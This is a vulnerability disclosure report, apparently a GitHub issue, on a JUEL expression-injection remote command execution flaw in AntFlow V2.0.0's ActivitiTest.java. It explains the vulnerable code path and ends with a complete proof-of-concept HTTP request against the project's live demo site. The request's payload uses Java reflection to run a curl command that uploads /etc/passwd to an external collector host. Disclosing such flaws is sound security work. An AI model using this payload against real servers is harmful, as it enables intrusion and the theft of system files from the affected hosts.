
# Front desk command execution
##### Vulnerability Location: ActivitiTest.java
##### Affected Range: AntFlow V2.0.0
##### Vulnerability Cause: ActivitiTest.java enables users to execute JUEL expressions without filtering the user input, which leads to a command execution vulnerability.
##### Vulnerability Impact: Obtain server access rights
##### Link: https://gitee.com/tylerzhou/Antflow/
# Vulnerability recurrence
(For verification, please refer to the official demo site! https://antflow.top/admin-api/activiti/evalExpression) Use curl to directly pass the file content:

<img width="1077" height="465" alt="image" src="https://github.com/user-attachments/assets/c6d1ac7c-2f1a-4c82-af24-d972b968bbba" />

<img width="920" height="414" alt="image" src="https://github.com/user-attachments/assets/5ff529bc-1861-4b88-9314-4f559a6606b3" />

# Code Analysis
There is a RCE vulnerability in the ActivitiTest.java file, where JuelEvaluator expression injection is used.

<img width="920" height="302" alt="image" src="https://github.com/user-attachments/assets/5f816fb3-b966-45ee-9fd1-1424dd681fa7" />

The requested method was not directly defined. The content of the "el" parameter was obtained without checking whether the parameter value met the security requirements. It was directly incorporated into:

<img width="616" height="90" alt="image" src="https://github.com/user-attachments/assets/d8dcf598-4857-4103-8f03-a7e1fc45d569" />

Following up to JuelEvaluator.java:

<img width="920" height="484" alt="image" src="https://github.com/user-attachments/assets/7f2018c5-354f-4f6b-93b1-85f504990347" />

First, obtain the ExpressionFactory. Then, create the expression and evaluate it, as well as execute the expression.

# POC
```
POST /admin-api/activiti/evalExpression HTTP/1.1
Host: antflow.top
Cookie: 
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
X-Custom-Header: foobar
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://antflow.top/admin/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
Content-Length: 293
Content-Type: application/json

{"el":"${it.getClass().forName('java.lang.Runtime').getMethod('exec', it.getClass().forName('java.lang.String')).invoke(it.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null), 'curl -X POST --data-binary @/etc/passwd http://f49xb1kn.requestrepo.com').waitFor() == 0}"}
```
